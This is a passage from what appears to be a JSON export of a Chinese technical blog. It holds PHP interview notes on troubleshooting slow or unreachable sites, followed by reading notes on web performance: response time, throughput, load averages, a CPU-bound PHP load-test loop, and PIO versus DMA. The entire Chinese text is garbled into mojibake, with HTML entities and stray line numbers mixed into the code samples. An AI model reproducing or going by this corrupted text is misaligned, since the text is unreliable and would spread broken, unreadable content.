æœåŠ¡å™¨å¸¦å®½ SQL æŸ¥è¯¢æ…¢i. Mysql æ…¢æŸ¥è¯¢æ‰¾å‡ºè€—æ—¶SQLii. Explain åˆ†æè€—æ—¶åŸå› iii. ä¼˜åŒ–SQL å¹¶å‘i. ä¼˜åŒ–PHP-FPM é…ç½® å¦‚æœä½ å‘ç°ä½ éƒ¨ç½²çš„ç½‘ç«™æ‰“ä¸å¼€äº†ï¼Œä½ ä¼šå¦‚ä½•æ’æŸ¥ï¼Ÿ é¦–å…ˆæ£€æŸ¥DNS è§£æi. æ£€æŸ¥åŸŸåè§£æii. æ’é™¤æµè§ˆå™¨ç¼“å­˜ æ£€æŸ¥é˜²ç«å¢™i. é˜²ç«å¢™æ˜¯å¦å¼€å¯ï¼Ÿii. ç«¯å£æ˜¯å¦å¯ä»¥æ­£å¸¸è®¿é—®ï¼Œé€šå¸¸ä½¿ç”¨telnet å‘½ä»¤æ£€æŸ¥ æ ¹æ®ç½‘ç«™è¿”å›çŠ¶æ€ç ï¼Œå…·ä½“åˆ†æi. 404ï¼šè®¿é—®èµ„æºä¸å­˜åœ¨ii. 500ï¼šæœåŠ¡ç«¯é”™è¯¯ï¼ˆä»£ç é”™è¯¯ã€æ–‡ä»¶æƒé™ï¼‰iii. 502ï¼šç½‘å…³é”™è¯¯ï¼ˆwebserver å¼‚å¸¸å¯¼è‡´ï¼ŒNginx/Apache å‘ç”Ÿé”™è¯¯ï¼‰iiii. 504ï¼šç½‘å…³è¶…æ—¶ æŸ¥çœ‹å¯¹åº”çš„æ—¥å¿— å‚è€ƒé“¾æ¥ PHPé¢è¯•é—®ç­”","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"é¢è¯•","slug":"é¢è¯•","permalink":"https://www.0x2beace.com/tags/%E9%9D%A2%E8%AF%95/"}]},{"title":"ã€Šæ„å»ºé«˜æ€§èƒ½ Web ç«™ç‚¹ã€‹è¯»ä¹¦ç¬”è®°","slug":"building-a-high-performance-web-site-reading-notes","date":"2021-02-06T15:49:18.000Z","updated":"2021-02-07T10:55:17.460Z","comments":true,"path":"building-a-high-performance-web-site-reading-notes/","link":"","permalink":"https://www.0x2beace.com/building-a-high-performance-web-site-reading-notes/","excerpt":"ã€Šæ„å»ºé«˜æ€§èƒ½ Web ç«™ç‚¹ã€‹è¯»ä¹¦ç¬”è®°","text":"ã€Šæ„å»ºé«˜æ€§èƒ½ Web ç«™ç‚¹ã€‹è¯»ä¹¦ç¬”è®° ç»ªè®ºç­‰å¾…çš„çœŸç›¸å½“åœ¨æµè§ˆå™¨ä¸­è¾“å…¥äº†ä¸€ä¸ªåœ°å€ï¼Œç›´åˆ°æµè§ˆå™¨è¿”å›é¡µé¢ä¹‹å‰çš„é‚£æ®µæ—¶é—´é‡Œï¼Œéƒ½å‘ç”Ÿäº†ä¸€äº›ä»€ä¹ˆå‘¢ï¼Ÿ å¤§æ¦‚ç»å†äº†ä»¥ä¸‹å‡ éƒ¨åˆ†æ—¶é—´ï¼š æ•°æ®åœ¨ç½‘ç»œä¸Šä¼ è¾“çš„æ—¶é—´ å®¢æˆ·ç«¯ï¼ˆæµè§ˆå™¨ï¼‰å‘å‡ºè¯·æ±‚æ•°æ®åˆ°è¾¾æœåŠ¡å™¨çš„æ—¶é—´ æœåŠ¡ç«¯ï¼ˆæœåŠ¡å™¨ï¼‰å“åº”æ•°æ®ç»è¿‡ç½‘ç»œåˆ°è¾¾å®¢æˆ·ç«¯çš„æ—¶é—´ ç«™ç‚¹æœåŠ¡å™¨å¤„ç†è¯·æ±‚å¹¶ç”Ÿæˆå“åº”æ•°æ®çš„æ—¶é—´ æµè§ˆå™¨æœ¬åœ°è®¡ç®—å’Œæ¸²æŸ“çš„æ—¶é—´ â€œæ•°æ®åœ¨ç½‘ç»œä¸Šä¼ è¾“çš„æ—¶é—´â€æˆ‘ä»¬é€šå¸¸ç§°ä¹‹ä¸ºå“åº”æ—¶é—´ï¼Œå®ƒçš„å†³å®šå› ç´ ä¸»è¦åŒ…æ‹¬å‘é€çš„æ•°æ®é‡å’Œç½‘ç»œå®½å¸¦ã€‚ ç«™ç‚¹æœåŠ¡å™¨å¤„ç†è¯·æ±‚å¹¶ç”Ÿæˆå“åº”æ•°æ®çš„æ—¶é—´ä¸»è¦æ¶ˆè€—åœ¨æœåŠ¡ç«¯ï¼Œå…¶ä¸­åŒ…æ‹¬éå¸¸å¤šçš„ç¯èŠ‚ï¼Œæˆ‘ä»¬ä¸€èˆ¬ç”¨å¦ä¸€ä¸ªæŒ‡æ ‡æ¥è¡¡é‡è¿™éƒ¨åˆ†æ—¶é—´ï¼Œå³æ¯ç§’å¤„ç†è¯·æ±‚æ•°ï¼Œä¹Ÿç§°ååç‡ï¼Œè¿™é‡Œçš„ååç‡å¹¶ä¸æ˜¯æŒ‡å•ä½æ—¶é—´å†…å¤„ç†çš„æ•°æ®é‡ï¼Œè€Œæ˜¯è¯·æ±‚æ•°ã€‚å½±å“æœåŠ¡å™¨ååç‡çš„å› ç´ éå¸¸å¤šï¼Œæ¯”å¦‚ï¼šæœåŠ¡å™¨çš„å¹¶å‘ç­–ç•¥ã€I/O æ¨¡å‹ã€I/O æ€§èƒ½ã€CPU æ ¸æ•°ç­‰ï¼Œå½“ç„¶ä¹ŸåŒ…æ‹¬åº”ç”¨ç¨‹åºæœ¬èº«çš„é€»è¾‘å¤æ‚åº¦ç­‰ã€‚ æµè§ˆå™¨æœ¬åœ°è®¡ç®—å’Œæ¸²æŸ“çš„æ—¶é—´è‡ªç„¶æ¶ˆè€—åœ¨æµè§ˆå™¨ç«¯ï¼Œå®ƒä¾èµ–çš„å› ç´ åŒ…æ‹¬æµè§ˆå™¨é‡‡ç”¨çš„å¹¶å‘ç­–ç•¥ã€æ ·å¼æ¸²æŸ“æ–¹å¼ã€è„šæœ¬è§£é‡Šå™¨çš„æ€§èƒ½ã€é¡µé¢å¤§å°ã€é¡µé¢ç»„ä»¶ï¼ˆå›¾ç‰‡ã€CSSã€JSç­‰ï¼‰æ•°é‡ã€é¡µé¢ç»„ä»¶ç¼“å­˜çŠ¶å†µã€é¡µé¢ç»„ä»¶åŸŸååˆ†å¸ƒåŠDNS è§£æç­‰ã€‚ æ•°æ®å¾—ç½‘ç»œä¼ è¾“å› ä¸ºå¤§å¤šæ•°å¼€å‘è€…ç”Ÿæ´»åœ¨åº”ç”¨å±‚ï¼Œè¿™äº›ä¼¼ä¹ä¸ä»–ä»¬æ¯«æ— å…³ç³»ï¼Œç„¶è€Œä¸€æ—¦å½“ä½ å¼€å§‹å°†æ³¨æ„åŠ›è½¬å‘ç«™ç‚¹æ€§èƒ½æ—¶ï¼Œè¿™äº›åŸºç¡€çŸ¥è¯†ä¾¿æ˜¯ä½ ä¸èƒ½ä¸çŸ¥é“çš„ã€‚ å¦‚ä½•è®¡ç®—å“åº”æ—¶é—´ å“åº”æ—¶é—´ = å‘é€æ—¶é—´ + ä¼ æ’­æ—¶é—´ + å¤„ç†æ—¶é—´ å‘é€æ—¶é—´å¾ˆå®¹æ˜“è®¡ç®—ï¼Œå³â€æ•°æ®é‡/å®½å¸¦â€œï¼Œæ¯”å¦‚è¦å‘é€100Mbit çš„æ•°æ®ï¼Œè€Œä¸”å‘é€é€Ÿåº¦ä¸º 100Mbit/sï¼Œä¹Ÿå°±æ˜¯å®½å¸¦ä¸º 100Mï¼Œé‚£ä¹ˆå‘é€æ—¶é—´ä¾¿ä¸º 1sã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ¨ä¸¤å°ä¸»æœºä¹‹é—´å¾€å¾€å­˜åœ¨å¤šä¸ªäº¤æ¢èŠ‚ç‚¹ï¼Œæ¯æ¬¡çš„æ•°æ®è½¬å‘ï¼Œéƒ½éœ€è¦èŠ±è´¹å‘é€æ—¶é—´ï¼Œé‚£ä¹ˆæ€»çš„å‘é€æ—¶é—´ä¹ŸåŒ…æ‹¬è¿™äº›è½¬å‘æ—¶æ‰€èŠ±è´¹çš„å‘é€æ—¶é—´ã€‚ ä¼ æ’­æ—¶é—´ä¸»è¦ä¾èµ–äºä¼ æ’­è·ç¦»ï¼Œå› ä¸ºä¼ æ’­é€Ÿåº¦æˆ‘ä»¬å¯ä»¥è¿‘ä¼¼è®¤ä¸ºçº¦ç­‰äº 2.0x108m/sï¼Œé‚£ä¹ˆä¼ æ’­æ—¶é—´ä¾¿ç­‰äºä¼ æ’­è·ç¦»é™¤ä»¥ä¼ æ’­é€Ÿåº¦ã€‚æ¯”å¦‚ä¸¤ä¸ªäº¤æ¢èŠ‚ç‚¹ä¹‹å‰çº¿è·¯çš„é•¿åº¦ä¸º 1000kmï¼Œç›¸å½“äºåŒ—äº¬åˆ°ä¸Šæµ·çš„ç›´çº¿è·ç¦»ï¼Œé‚£ä¹ˆä¸€ä¸ªæ¯”ç‰¹ä¿¡å·ä»çº¿è·¯çš„ä¸€ç«¯åˆ°å¦ä¸€ç«¯çš„ä¼ æ’­æ—¶é—´ä¸º 0.005sã€‚ å¤„ç†æ—¶é—´å°±æ˜¯æŒ‡æ•°æ®åœ¨äº¤æ¢èŠ‚ç‚¹ä¸­ä¸ºå­˜å‚¨è½¬å‘è€Œè¿›è¡Œä¸€äº›å¿…è¦çš„å¤„ç†æ‰€èŠ±è´¹çš„æ—¶é—´ï¼Œå…¶ä¸­çš„é‡è¦ç»„æˆéƒ¨åˆ†å°±æ˜¯æ•°æ®åœ¨ç¼“å†²åŒºé˜Ÿåˆ—ä¸­æ’é˜Ÿæ‰€å‘é€çš„æ—¶é—´ã€‚æ³¨æ„ï¼Œå‡†ç¡®åœ°è¯´åº”è¯¥æ˜¯â€ä½ çš„æ•°æ®â€œåœ¨é˜Ÿåˆ—ä¸­æ’é˜Ÿæ‰€èŠ±è´¹çš„æ—¶é—´ï¼Œå› ä¸ºåœ¨é˜Ÿä¼ä¸­è¿˜æœ‰å…¶ä»–ä¸ä½ æ¯«ä¸ç›¸å¹²çš„æ•°æ®ã€‚ å¦‚æœå…¨ä¸–ç•Œåªæœ‰ä½ çš„æœåŠ¡å™¨å’Œä½ çš„ç”¨æˆ·åœ¨ä¼ è¾“æ•°æ®ï¼Œé‚£ä¹ˆç”¨äºæ’é˜Ÿå¤„ç†æ—¶é—´å¯ä»¥å¿½ç•¥ã€‚ é‚£ä¹ˆï¼Œæˆ‘ä»¬å¯å°†å“åº”æ—¶é—´çš„è®¡ç®—å…¬å¼æ•´ç†ä¸ºï¼šå“åº”æ—¶é—´ = ï¼ˆæ•°æ®é‡æ¯”ç‰¹æ•° / å¸¦å®½ï¼‰+ ï¼ˆä¼ æ’­è·ç¦» / ä¼ æ’­é€Ÿåº¦ï¼‰+ å¤„ç†æ—¶é—´ å¦å¤–ï¼Œä¸‹è½½é€Ÿåº¦çš„è®¡ç®—å…¬å¼å¦‚ä¸‹ï¼šä¸‹è½½é€Ÿåº¦ = æ•°æ®é‡å­—èŠ‚æ•° / å“åº”æ—¶é—´ æœåŠ¡å™¨å¹¶å‘å¤„ç†èƒ½åŠ›ååç‡æŒ‡çš„æ˜¯å•ä½æ—¶é—´å†…æœåŠ¡å™¨çš„è¯·æ±‚æ•°ã€‚ ååç‡æ˜¯æŒ‡åœ¨ä¸€å®šå¹¶å‘ç”¨æˆ·æ•°çš„æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨å¤„ç†è¯·æ±‚èƒ½åŠ›çš„é‡åŒ–ä½“ç°ã€‚ æˆ‘ä»¬è¦ç»Ÿè®¡ååç‡ï¼Œä¾¿å­˜åœ¨ä¸€äº›æ½œåœ¨çš„å‰æï¼Œé‚£å°±æ˜¯å‹åŠ›çš„æè¿°å’Œè¯·æ±‚æ€§è´¨çš„æè¿°ã€‚ å‹åŠ›çš„æè¿°ä¸€èˆ¬åŒ…æ‹¬ä¸¤éƒ¨åˆ†ï¼Œå³å¹¶å‘ç”¨æˆ·æ•°å’Œæ€»è¯·æ±‚æ•°ï¼Œä¹Ÿå°±æ˜¯æ¨¡æ‹Ÿå¤šå°‘ä¸ªç”¨æˆ·åŒæ—¶å‘æœåŠ¡å™¨å‘é€å¤šå°‘ä¸ªè¯·æ±‚ã€‚ è¯·æ±‚æ€§è´¨åˆ™æ˜¯å †è¯·æ±‚çš„URL æ‰€ä»£è¡¨çš„èµ„æºçš„æè¿°ï¼Œæ¯”å¦‚ 1KB å¤§å°çš„é™æ€æ–‡ä»¶ï¼Œæˆ–è€…åŒ…å«10 æ¬¡æ•°æ®åº“æŸ¥è¯¢çš„åŠ¨æ€å†…å®¹ç­‰ã€‚ æ‰€ä»¥ï¼Œååç‡çš„å‰æåŒ…æ‹¬å¦‚ä¸‹å‡ ä¸ªæ¡ä»¶ï¼š å¹¶å‘ç”¨æˆ·æ•° æ€»è¯·æ±‚æ•° è¯·æ±‚èµ„æºæè¿° CPU å¹¶å‘è®¡ç®—æœåŠ¡å™¨ä¹‹æ‰€ä»¥å¯ä»¥åŒæ—¶å¤„ç†å¤šä¸ªè¯·æ±‚ï¼Œåœ¨äºæ“ä½œç³»ç»Ÿé€šè¿‡å¤šæ‰§è¡Œæµä½“å¸Œè®¾è®¡ä½¿å¾—å¤šä¸ªä»»åŠ¡å¯ä»¥è½®æµä½¿ç”¨ç³»ç»Ÿèµ„æºï¼Œè¿™äº›èµ„æºåŒ…æ‹¬CPUã€å†…å­˜ä»¥åŠI/O ç­‰ã€‚ è¿›ç¨‹äº‹å®ä¸Šï¼Œå¤§å¤šæ•°è¿›ç¨‹çš„æ—¶é—´éƒ½ä¸»è¦æ¶ˆè€—åœ¨äº†I/Oæ“ä½œä¸Šï¼Œç°ä»£è®¡ç®—æœºçš„DMAï¼ˆDirect Memory Access ç›´æ¥å†…å­˜è®¿é—®ï¼‰æŠ€æœ¯å¯ä»¥è®©CPU ä¸å‚ä¸I/O æ“ä½œçš„å…¨è¿‡ç¨‹ï¼Œæ¯”å¦‚è¿›ç¨‹é€šè¿‡ç³»ç»Ÿè°ƒç”¨ï¼Œä½¿å¾—CPU å‘ç½‘å¡æˆ–è€…ç£ç›˜ç­‰ I/O è®¾å¤‡å‘å‡ºæŒ‡ä»¤ï¼Œç„¶åè¿›ç¨‹è¢«æŒ‚èµ·ï¼Œé‡Šæ”¾å‡ºCPU èµ„æºï¼Œç­‰å¾… I/O è®¾å¤‡å®Œæˆå·¥ä½œåé€šè¿‡ä¸­æ–­æ¥é€šçŸ¥è¿›ç¨‹é‡æ–°å°±ç»ªã€‚ æ¯ä¸ªè¿›è¡Œéƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„å†…å­˜åœ°å€ç©ºé—´å’Œç”Ÿå‘½å‘¨æœŸã€‚å½“å­è¿›ç¨‹è¢«çˆ¶è¿›ç¨‹åˆ›å»ºåï¼Œä¾¿å°†çˆ¶è¿›ç¨‹åœ°å€ç©ºé—´çš„æ‰€æœ‰æ•°æ®å¤åˆ¶åˆ°è‡ªå·±çš„åœ°å€ç©ºé—´ï¼Œå®Œå…¨ç»§æ‰¿çˆ¶è¿›ç¨‹çš„æ‰€æœ‰ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œå®ƒä»¬ä¹‹é—´å¯ä»¥é€šä¿¡ï¼Œä½†æ˜¯ä¸äº’ç›¸ä¾èµ–ï¼Œä¹Ÿæ— æƒå¹²æ¶‰å½¼æ­¤çš„åœ°å€ç©ºé—´ã€‚ è¿›ç¨‹è°ƒåº¦å™¨åœ¨å•CPU çš„æœºå™¨ä¸Šï¼Œè™½ç„¶æˆ‘ä»¬æ„Ÿè§‰åˆ°å¾ˆå¤šä»»åŠ¡åœ¨åŒæ—¶è¿è¡Œï¼Œä½†æ˜¯ä»å¾®è§‚æ„ä¹‰ä¸Šè®²ï¼Œä»»ä½•æ—¶åˆ»åªæœ‰ä¸€ä¸ªè¿›ç¨‹å¤„äºè¿è¡ŒçŠ¶æ€ï¼Œè€Œå…¶ä»–çš„è¿›ç¨‹æœ‰çš„å¤„äºæŒ‚èµ·çŠ¶æ€å¹¶ç­‰å¾…å°±ç»ªï¼Œæœ‰çš„å·²ç»å°±ç»ªä½†ç­‰å¾…CPU æ—¶é—´ç‰‡ï¼Œè¿˜æœ‰çš„å¤„äºå…¶ä»–çŠ¶æ€ã€‚ å†…æ ¸ä¸­çš„è¿›ç¨‹è°ƒåº¦å™¨ï¼ˆSchedulerï¼‰ç»´æŠ¤ç€å„ç§çŠ¶æ€çš„è¿›ç¨‹é˜Ÿåˆ—ã€‚åœ¨ Linux ä¸­ï¼Œè¿›ç¨‹è°ƒåº¦å™¨ç»´æŠ¤ç€ä¸€ä¸ªåŒ…æ‹¬æ‰€æœ‰å¯è¿è¡Œè¿›ç¨‹çš„é˜Ÿåˆ—ï¼Œç§°ä¸ºâ€œè¿è¡Œé˜Ÿåˆ—ï¼ˆRun Quereï¼‰â€ï¼Œä»¥åŠä¸€ä¸ªåŒ…æ‹¬æ‰€æœ‰ä¼‘çœ è¿›ç¨‹å’Œåƒµå°¸è¿›ç¨‹çš„åˆ—è¡¨ã€‚ è¿›ç¨‹è°ƒåº¦å™¨çš„ä¸€é¡¹é‡è¦å·¥ä½œå°±æ˜¯å†³å®šä¸‹ä¸€ä¸ªè¿è¡Œçš„è¿›ç¨‹ï¼Œå¦‚æœè¿è¡Œé˜Ÿåˆ—ä¸­æœ‰ä¸æ­¢ä¸€ä¸ªè¿›ç¨‹ï¼Œé‚£å°±æ¯”è¾ƒä¼¤è„‘ç­‹äº†ï¼ŒæŒ‰ç…§å…ˆæ¥ååˆ°çš„é¡ºåºä¹Ÿè®¸ä¸æ˜¯é‚£ä¹ˆåˆç†ï¼Œå› ä¸ºè¿è¡Œåœ¨ç³»ç»Ÿä¸­çš„è¿›ç¨‹æœ‰ç€ä¸åŒçš„å·¥ä½œéœ€è¦ï¼Œæ¯”å¦‚æœ‰äº›è¿›ç¨‹éœ€è¦å¤„ç†ç´§æ€¥çš„äº‹ä»¶ï¼Œæœ‰äº›è¿›ç¨‹åªæ˜¯åœ¨åå°å‘é€ä¸å¤ªç´§æ€¥çš„é‚®ä»¶ï¼Œæ‰€ä»¥æ¯ä¸ªè¿›ç¨‹éœ€è¦å‘Šè¯‰è¿›ç¨‹è°ƒåº¦å™¨å®ƒä»¬çš„ç´§æ€¥ç¨‹åº¦ï¼Œè¿™å°±æ˜¯è¿›ç¨‹ä¼˜å…ˆçº§ã€‚ ç³»ç»Ÿè´Ÿè½½åœ¨è¿›ç¨‹è°ƒåº¦å™¨ç»´æŠ¤çš„è¿è¡Œé˜Ÿåˆ—ä¸­ï¼Œä»»ä½•æ—¶åˆ»è‡³å°‘å­˜åœ¨ä¸€ä¸ªè¿›ç¨‹ï¼Œé‚£å°±æ˜¯æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ã€‚è€Œå½“è¿è¡Œé˜Ÿåˆ—ä¸­æœ‰ä¸æ­¢ä¸€ä¸ªè¿›ç¨‹çš„æ—¶å€™ï¼Œå°±è¯´æ˜æ­¤æ—¶CPU æ¯”è¾ƒæŠ¢æ‰‹ï¼Œå…¶ä»–è¿›ç¨‹è¿˜åœ¨ç­‰ç€å‘¢ï¼Œè¿›ç¨‹è°ƒåº¦å™¨åº”è¯¥å°½å¿«è®©æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹é‡Šæ”¾CPUã€‚ é€šè¿‡åœ¨ä»»ä½•æ—¶åˆ»æŸ¥çœ‹ /proc/loadavgï¼Œå¯ä»¥äº†è§£åˆ°è¿è¡Œé˜Ÿåˆ—çš„æƒ…å†µã€‚ 12ubuntu@localhost:~$ cat &#x2F;proc&#x2F;loadavg 4.28 4.05 4.02 4&#x2F;482 6246 æ³¨æ„ 4/482è¿™éƒ¨åˆ†ï¼Œå…¶ä¸­çš„ 4 ä»£è¡¨æ­¤æ—¶è¿è¡Œé˜Ÿåˆ—ä¸­çš„è¿›ç¨‹ä¸ªæ•°ï¼Œè€Œ 482 åˆ™ä»£è¡¨æ­¤æ—¶çš„è¿›ç¨‹æ€»æ•°ã€‚ æœ€å³è¾¹çš„ 6246 ä»£è¡¨åˆ°æ­¤æ—¶ä¸ºæ­¢ï¼Œæœ€ååˆ›å»ºçš„ä¸€ä¸ªè¿›ç¨‹IDã€‚ æ¥ä¸‹æ¥ï¼Œå·¦è¾¹çš„ä¸‰ä¸ªæ•°å€¼ï¼Œåˆ†åˆ«æ˜¯ 4.28ã€4.05ã€4.02ï¼Œå®ƒä»¬å°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„ç³»ç»Ÿè´Ÿè½½ã€‚æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œç³»ç»Ÿè´Ÿè½½è¶Šé«˜ï¼Œä»£è¡¨CPU è¶Šç¹å¿™ï¼Œè¶Šæ— æ³•å¾ˆå¥½åœ°æ»¡è¶³æ‰€æœ‰è¿›ç¨‹çš„éœ€è¦ã€‚ ä½†æ˜¯ï¼Œç³»ç»Ÿè´Ÿè½½æ˜¯å¦‚ä½•è®¡ç®—è€Œæ¥çš„å‘¢ï¼Ÿæ ¹æ®å®šä¹‰ï¼Œå®ƒæ˜¯åœ¨å•ä½æ—¶é—´å†…è¿è¡Œé˜Ÿåˆ—ä¸­å°±ç»ªç­‰å¾…çš„è¿›ç¨‹æ•°å¹³å‡å€¼ï¼Œæ‰€ä»¥å½“è¿è¡Œé˜Ÿåˆ—ä¸­å°±ç»ªè¿›ç¨‹ä¸éœ€è¦ç­‰å¾…å°±å¯ä»¥é©¬ä¸Šè·å¾—CPU çš„æ—¶å€™ï¼Œç³»ç»Ÿè´Ÿè½½ä¾¿éå¸¸ä½ã€‚å½“ç³»ç»Ÿè´Ÿè½½ä¸º 0.00 æ—¶ï¼Œè¯´æ˜ä»»ä½•è¿›ç¨‹åªè¦å°±ç»ªåå°±å¯ä»¥é©¬ä¸Šè·å¾— CPUï¼Œä¸éœ€è¦ç­‰å¾…ï¼Œè¿™æ—¶å€™ç³»ç»Ÿå“åº”é€Ÿåº¦æœ€å¿«ã€‚ é‚£ä¹ˆï¼Œåˆšæ‰æåˆ°çš„ä¸‰ä¸ªæ•°å€¼ï¼Œä¾¿æ˜¯ç³»ç»Ÿæœ€è¿‘ 1 åˆ†é’Ÿã€5 åˆ†é’Ÿã€15 åˆ†é’Ÿåˆ†åˆ«è®¡ç®—å¾—å‡ºçš„ç³»ç»Ÿè´Ÿè½½ã€‚ æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡å…¶ä»–æ–¹æ³•è·å¾—ç³»ç»Ÿè´Ÿè½½ï¼Œæ¯”å¦‚topã€w ç­‰å·¥å…·ï¼Œä»å®ç°æ–¹æ³•ä¸Šçœ‹ï¼Œè¿™äº›å·¥å…·è·å¾—çš„ç³»ç»Ÿè´Ÿè½½éƒ½æ˜¯æ¥æºäº /proc/loadavgã€‚ äº†è§£äº†è¿™äº›å†…å®¹åï¼Œè¦æƒ³æé«˜æœåŠ¡å™¨çš„ç³»ç»Ÿè´Ÿè½½ï¼Œå¾ˆç®€å•ï¼Œåªéœ€è¦ç¼–å†™ä¸€ä¸ªæ²¡æœ‰ä»»ä½• I/O æ“ä½œå¹¶ä¸”é•¿æ—¶é—´å ç”¨ CPU æ—¶é—´çš„PHP è„šæœ¬ï¼Œæ¯”å¦‚ä¸€ä¸ªå¾ªç¯ç´¯åŠ å™¨ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 12345678&lt;?php$max &#x3D; 100000000;$sum &#x3D; 0;for ($i &#x3D; 0; $i &lt; $max; ++$i)&#123; $sum +&#x3D; $i;&#125;echo $sum; ç„¶åç”¨100 ä¸ªå¹¶å‘ç”¨æˆ·è¯·æ±‚è¿™ä¸ªè„šæœ¬ï¼Œè¿›è¡Œå‹åŠ›æµ‹è¯•ï¼Œè¿™æ—¶å€™æŸ¥çœ‹ç³»ç»Ÿè´Ÿè½½å°±ä¼šçœ‹åˆ°å¦‚ä¸‹ï¼š 1load average: 98.26, 45.89, 17.94 è¿›ç¨‹åˆ‡æ¢æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬å¸Œæœ›æœåŠ¡å™¨æ”¯æŒè¾ƒå¤§çš„å¹¶å‘æ•°ï¼Œé‚£ä¹ˆå°±è¦å°½é‡å‡å°‘ä¸Šä¸‹æ–‡åˆ‡æ¢æ¬¡æ•°ï¼Œæœ€ç®€å•çš„åšæ³•å°±æ˜¯å‡å°‘è¿›ç¨‹æ•°ï¼Œå°½é‡ä½¿ç”¨çº¿ç¨‹å¹¶é…åˆå…¶ä»–I/O æ¨¡å‹æ¥è®¾è®¡å¹¶å‘ç­–ç•¥ã€‚ I/Oæ¨¡å‹å¯¹äºç½‘ç»œ I/Oå’Œç£ç›˜ I/Oï¼Œå®ƒä»¬çš„é€Ÿåº¦è¦æ…¢å¾ˆå¤šã€‚è¿™äº›I/O æ“ä½œéœ€è¦ç”±å†…æ ¸ç³»ç»Ÿè°ƒç”¨æ¥å®Œæˆï¼ŒåŒæ—¶ç³»ç»Ÿè°ƒç”¨æ˜¾ç„¶éœ€è¦CPU æ¥è°ƒåº¦ï¼Œè€ŒCPU çš„é€Ÿåº¦æ¯«æ— ç–‘é—®æ˜¯éå¸¸å¿«çš„ï¼Œè¿™å°±ä½¿å¾—CPU ä¸å¾—ä¸æµªè´¹å®è´µçš„æ—¶é—´æ¥ç­‰å¾…æ…¢é€ŸI/O æ“ä½œã€‚ å°½ç®¡æˆ‘ä»¬é€šè¿‡å¤šè¿›ç¨‹ç­‰æ–¹å¼æ¥å……åˆ†åˆ©ç”¨ç©ºé—²çš„CPU èµ„æºï¼Œä½†æˆ‘ä»¬è¿˜æ˜¯å¸Œæœ›èƒ½å¤Ÿè®©CPU èŠ±è´¹è¶³å¤Ÿå°‘çš„æ—¶é—´åœ¨I/O æ“ä½œçš„è°ƒåº¦ä¸Šï¼Œè¿™æ ·å°±å¯ä»¥è…¾å‡ºæ›´å¤šçš„CPU æ—¶é—´æ¥å®Œæˆæ›´å¤šçš„I/O æ“ä½œã€‚ PIOä¸DMAåœ¨ä»‹ç»I/O æ¨¡å‹ä¹‹å‰ï¼Œæœ‰å¿…è¦ç®€å•åœ°è¯´è¯´æ…¢é€ŸI/O è®¾å¤‡å’Œå†…å­˜ä¹‹é—´çš„æ•°æ®ä¼ è¾“æ–¹å¼ã€‚ æˆ‘ä»¬æ‹¿ç£ç›˜æ¥è¯´ï¼Œå¾ˆæ—©ä»¥å‰ï¼Œç£ç›˜å’Œå†…å­˜ä¹‹é—´çš„æ•°æ®ä¼ è¾“æ˜¯éœ€è¦CPU æ§åˆ¶çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬è¯»å–ç£ç›˜æ–‡ä»¶åˆ°å†…å­˜ä¸­ï¼Œæ•°æ®è¦ç»è¿‡CPU å­˜å‚¨è½¬å‘ï¼Œè¿™ç§æ–¹å¼ç§°ä¸º PIOã€‚æ˜¾ç„¶è¿™ç§æ–¹å¼éå¸¸ä¸åˆç†ï¼Œéœ€è¦å ç”¨å¤§é‡çš„CPU æ—¶é—´æ¥è¯»å–æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶è®¿é—®æ—¶ç³»ç»Ÿå‡ ä¹åœæ­¢å“åº”ã€‚ åæ¥ï¼ŒDMAï¼ˆDirect Memory Access ç›´æ¥å†…å­˜è®¿é—®ï¼‰å–ä»£äº†PIOï¼Œå®ƒå¯ä»¥ä¸ç»è¿‡CPU è€Œç›´æ¥è¿›è¡Œç£ç›˜å’Œå†…å­˜çš„æ•°æ®äº¤æ¢ã€‚åœ¨DMA æ¨¡å¼ä¸‹ï¼ŒCPU åªéœ€è¦å‘DMA æ§åˆ¶å™¨ä¸‹è¾¾æŒ‡ä»¤ï¼Œè®©DMA æ§åˆ¶å™¨æ¥å¤„ç†æ•°æ®çš„ä¼ è¾“å³å¯ï¼ŒDMA æ§åˆ¶å™¨é€šè¿‡ç³»ç»Ÿæ€»çº¿æ¥ä¼ è¾“æ•°æ®ï¼Œä¼ é€å®Œæ¯•å†é€šçŸ¥CPUï¼Œè¿™æ ·å°±å¾ˆå¤§ç¨‹åº¦ä¸Šé™ä½äº†CPU å æœ‰ç‡ï¼Œå¤§å¤§èŠ‚çœäº†ç³»ç»Ÿèµ„æºï¼Œè€Œå®ƒçš„ä¼ è¾“é€Ÿåº¦ä¸PIO çš„å·®å¼‚å¹¶ä¸æ˜¯ååˆ†æ˜æ˜¾ï¼Œå› ä¸ºè¿™ä¸»è¦å–å†³äºæ…¢é€Ÿè®¾å¤‡çš„é€Ÿåº¦ã€‚ opcodeç¼“å­˜æ›´åŠ æ³¨é‡çš„æ˜¯ç­–ç•¥ï¼Œä¹Ÿå°±æ˜¯è¯´ç¼“å­˜å‘½ä¸­ç‡ï¼Œå¦‚æœæ¯æ¬¡éƒ½èƒ½åœ¨ç¼“å­˜ä¸­æ‰¾åˆ°éœ€è¦çš„æ•°æ®ï¼Œé‚£æ˜¯æœ€ç†æƒ³çš„ç»“æœï¼Œå¦‚æœæ¯æ¬¡éƒ½åœ¨ç¼“å­˜ä¸­æ‰¾ä¸åˆ°éœ€è¦çš„æ•°æ®ï¼Œé‚£ä¹ˆç¼“å­˜å°†å˜å¾—æ¯«æ— ä»·å€¼ã€‚ è§£é‡Šå™¨æ ¸å¿ƒå¼•æ“æ ¹æœ¬çœ‹ä¸æ‡‚è¿™äº›è„šæœ¬ä»£ç ï¼Œæ— 